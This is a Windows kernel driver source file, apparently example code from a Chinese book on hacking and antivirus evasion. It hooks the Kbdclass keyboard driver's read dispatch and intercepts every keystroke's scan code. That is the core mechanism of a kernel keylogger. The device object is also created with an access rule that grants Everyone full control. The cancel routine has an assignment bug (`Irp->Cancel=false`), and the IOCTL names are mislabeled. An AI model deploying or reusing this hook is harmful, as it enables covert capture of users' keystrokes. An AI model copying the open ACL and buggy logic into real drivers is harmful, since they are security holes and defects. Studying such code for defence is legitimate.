/*
*  《黑客免杀攻防》例子代码
*
*  作    者：任晓珲（A1Pass）
*  日    期：2012-12-28
*  本书官网：http://book.hackav.com  或 http://www.hzbook.com
*  作者微博：http://weibo.com/a1pass 或 http://t.qq.com/a1pass
*  作者博客：http://a1pass.blog.163.com
*/
#include "IRP_Hook.h"


/*
* IRP_MJ_READ 的自定义完成例程
*
*     此完成例程主要用于打印键盘扫描码，并调用 IRP_MJ_READ 的原完成例程，是完成
* 键盘过滤的最后一步。
*/
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context )
{
    g_uPendingIrpsCount--; 

    // 1. 获取键盘缓冲区数据，并打印其中的扫描码
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) 
    {
        PVOID pBuf       = Irp->AssociatedIrp.SystemBuffer;         // 按键缓冲区
        ULONG uBufLen    = Irp->IoStatus.Information;               // 按键缓冲区长度
        ULONG uKeysCount = uBufLen / sizeof(KEYBOARD_INPUT_DATA);   // 按键数量
        PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pBuf; // 按键信息 

        for(ULONG i=0; i<uKeysCount; i++)
        {
            DbgPrint( "KeysCount: %d", uKeysCount );
            DbgPrint( "ScanCode : %x ", pKeyData->MakeCode ); 
            DbgPrint( "%s\r\n", pKeyData->Flags ? "Up":"Down" );
        }
    }

    // 2. 如果IRP状态为返回未决，则需要挂起这个IRP
    if( Irp->PendingReturned )    IoMarkIrpPending( Irp ); 

    // 3. 如果IRP的Context中保存有原完成例程，则调用之，否则返回
    if ( (Irp->StackCount>(ULONG)1) && Context )
        return ((PIO_COMPLETION_ROUTINE)Context)(DeviceObject, Irp, NULL);
    else
        return Irp->IoStatus.Status;
}





/*
* IRP_MJ_READ 的自定义派遣函数
*
*     此派遣函数用于保留原完成例程，并将其替换为自定义完成例程OnReadCompletion，
* 在结束时调用系统的原派遣函数。
*/
NTSTATUS MyReadDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{ 
    // 1. 获取IRP堆栈，并设置控制标志位
    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);
    pStack->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;

    // 2. 保留原来的完成例程后，将其替换为我们自定义的完成例程
    pStack->Context           = pStack->CompletionRoutine;
    pStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)OnReadCompletion;  
    KdPrint(("完成例程已设置...\r\n"));  

    // 3. 将未决IRP数量加1后，保存当前IRP
    g_uPendingIrpsCount++;
    g_pPendingIrp = pIrp; 

    // 4. 调用系统原派遣函数
    return g_OrigDispatchRead(pDeviceObject,pIrp);
}





/*
* 取消键盘IRP
*
*     此函数用于尝试取消键盘IRP，以使得程序可以正常卸载。
*/
BOOLEAN CancelKeyboardIrp(IN PIRP Irp)
{
    // 1. 如果IRP是有效的，并且此IRP未被取消或其取消例程有值，则执行取消IRP的操作
    if (Irp && (Irp->Cancel=false||Irp->CancelRoutine) )
    {
        if ( !IoCancelIrp(Irp) )
        {
            KdPrint(( "取消IRP操作执行失败！\r\n" ));
            return false;
        }
    }

    // 2. 取消后重设此完成例程为空
    IoSetCancelRoutine( Irp, NULL );
    return true; 
}





NTSTATUS IRPHook()
{
    NTSTATUS       nStatus    = 0; 
    UNICODE_STRING strKbdName = RTL_CONSTANT_STRING(L"\\Driver\\Kbdclass");

    // 1. 获取驱动设备对象
    nStatus = ObReferenceObjectByName( 
        &strKbdName, 
        OBJ_CASE_INSENSITIVE, 
        NULL, 
        0, 
        *IoDriverObjectType, 
        KernelMode,
        NULL, 
        &g_objKbdDriver);
    if (!NT_SUCCESS(nStatus))
    {
        KdPrint(("获取kbd驱动对象失败！\r\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // 2. 解除引用
    ObDereferenceObject(g_objKbdDriver);
    
    // 3. 保存原派遣函数
    g_OrigDispatchRead = g_objKbdDriver->MajorFunction[IRP_MJ_READ];

    // 4. 替换IRP_MJ_READ的派遣函数为我们自定义的MyDispatchRead 
    InterlockedExchangePointer(&g_objKbdDriver->MajorFunction[IRP_MJ_READ],MyReadDispatch);

    return STATUS_SUCCESS;
}





NTSTATUS UnIRPHook()
{
    // 1. 如果原派遣函数未获取，则直接退出IRP摘钩函数
    if ( !g_OrigDispatchRead )    return STATUS_UNSUCCESSFUL;

    // 2. 把当前线程设置为低实时模式，以便让它的运行尽量少影响其他程序
    KeSetPriorityThread(KeGetCurrentThread(), LOW_REALTIME_PRIORITY);

    // 3. 还原IRP hook
    InterlockedExchangePointer( &g_objKbdDriver->MajorFunction[IRP_MJ_READ], g_OrigDispatchRead);

    // 4. 如果还有IRP未完成且当前IRP有效则，则尝试取消这个IRP
    if (g_uPendingIrpsCount>0 && g_pPendingIrp)
    {
        if ( !CancelKeyboardIrp(g_pPendingIrp) )
        {
            // 循环等待IRP完成
            LARGE_INTEGER stcDelay = RtlConvertLongToLargeInteger(500*MILLI_SECOND);
            while (g_uPendingIrpsCount)
            {
                KdPrint(("还有%d个IRP在等待中……\r\n",g_uPendingIrpsCount));
                KeDelayExecutionThread(KernelMode, FALSE, &stcDelay);
            }
        }
    }

    return STATUS_SUCCESS;
}





NTSTATUS DriverEntry(IN PDRIVER_OBJECT objDriver, IN PUNICODE_STRING strRegPath)
{
    UNREFERENCED_PARAMETER(strRegPath);
    KdPrint(("DDK_DriverExample Compiled %s %s\r\nIn DriverEntry : %wZ\r\n", __DATE__, __TIME__, strRegPath));

    // 1. 声明并初始化关键局部变量
    NTSTATUS       nStatus       = STATUS_SUCCESS;
    // 设备对象
    PDEVICE_OBJECT objDev        = nullptr;
    // 设备名称
    UNICODE_STRING strDeviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
    // 符号链接名称
    UNICODE_STRING strSymbolicName;
    // 所有用户可读可写权限的SDDL
    UNICODE_STRING strSDDL       = RTL_CONSTANT_STRING(L"D:P(A;;GA;;;WD)");
    // 自己随便写一个GUID，或使用Visual Studio自带的GUID生成器生成一个
    const GUID     MY_GUID       = {0x12345678L,0x1234,0x1234,{0x12,0x34,0x56,0x78,0x90,0xAB,0xCB,0xEF}};

    // 2. 创建带安全描述符的设备对象
    nStatus = IoCreateDeviceSecure( 
        objDriver,                  // 驱动对象
        0,                          // 设备扩展对象的结构体大小
        &strDeviceName,             // 设备名称
        FILE_DEVICE_UNKNOWN,        // 设备类型
        FILE_DEVICE_SECURE_OPEN,    // 设备特征信息
        FALSE,                      // 设备是否为独占的
        &strSDDL,                   // 安全描述符定义语言
        &MY_GUID,                   // GUID
        &objDev);                   // 输出创建完成的设备对象指针
    if(!NT_SUCCESS(nStatus))
    {
        KdPrint(("Error, IoCreateDevice = 0x%x\r\n", nStatus));
        return nStatus;
    }

    // 3. 创建链接符号
    if(IoIsWdmVersionAvailable(1,0x10))
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
    else
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);

    nStatus = IoCreateSymbolicLink(&strSymbolicName, &strDeviceName);
    if(!NT_SUCCESS(nStatus))
    {
        KdPrint(("Error, IoCreateSymbolicLink = 0x%x\r\n", nStatus));
        IoDeleteDevice(objDev);
        return nStatus;
    }

    // 4. 设置派遣函数
    objDriver->MajorFunction[IRP_MJ_CREATE]         = (PDRIVER_DISPATCH)DispatchCreateClose;
    objDriver->MajorFunction[IRP_MJ_CLOSE]          = (PDRIVER_DISPATCH)DispatchCreateClose;
    objDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)DispatchDeviceControl;

    // 5. 设置卸载函数
    objDriver->DriverUnload = DriverUnload;


    return STATUS_SUCCESS;
}


NTSTATUS DispatchCreateClose(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
    UNREFERENCED_PARAMETER(objDeivce);

    // 设置IRP完成状态
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    // 设置IRP操作了多少字节
    pIrp->IoStatus.Information = 0;
    // 处理IRP
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
    // 1. 声明并初始化关键局部变量
    UNREFERENCED_PARAMETER(objDeivce);
    NTSTATUS nStatus             = STATUS_INVALID_DEVICE_REQUEST;
    PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
    ULONG uIoControlCode         = 0;
    PVOID pIoBuffer                 = NULL;
    ULONG uInSize                = 0;
    ULONG uOutSize               = 0;
    // 获取IoCtrl码
    uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
    // 获取传入I/O缓存
    pIoBuffer      = pIrp->AssociatedIrp.SystemBuffer;
    // 获取传入I/O缓存的大小
    uInSize        = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
    // 获取传出I/O缓存的大小
    uOutSize       = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

    // 2. 相应用户信息
    switch(uIoControlCode)
    {
    case IOCTL_HELLO_WORLD:     // 打印字符串
        KdPrint(("Hello World!\r\n"));
        nStatus = STATUS_SUCCESS;
        break;
    case IOCTL_HOOK_SYSENTER:   // IRPHook
        IRPHook();
        nStatus = STATUS_SUCCESS;
        break;
    case IOCTL_UNHOOK_SYSENTER: // UnIRPHook
        UnIRPHook();
        nStatus = STATUS_SUCCESS;
        break;
    default:
        KdPrint(("Unknown IOCTL: 0x%X (%04X,%04X)\r\n", 
            uIoControlCode,
            DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
            IoGetFunctionCodeFromCtlCode(uIoControlCode) ));
        nStatus = STATUS_INVALID_PARAMETER;    
        break;
    }

    // 3. 完成I/O请求
    if(nStatus == STATUS_SUCCESS)
        pIrp->IoStatus.Information = uOutSize;
    else
        pIrp->IoStatus.Information = 0;
    pIrp->IoStatus.Status = nStatus;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return nStatus;
}


VOID DriverUnload(IN PDRIVER_OBJECT objDriver)
{
    // 1. 删除链接符号
    UNICODE_STRING strSymbolicName;
    if(IoIsWdmVersionAvailable(1,0x10))
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
    else
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);
    IoDeleteSymbolicLink(&strSymbolicName);

    // 2. 删除设备对象
	if ( objDriver->DeviceObject )
        IoDeleteDevice(objDriver->DeviceObject);
}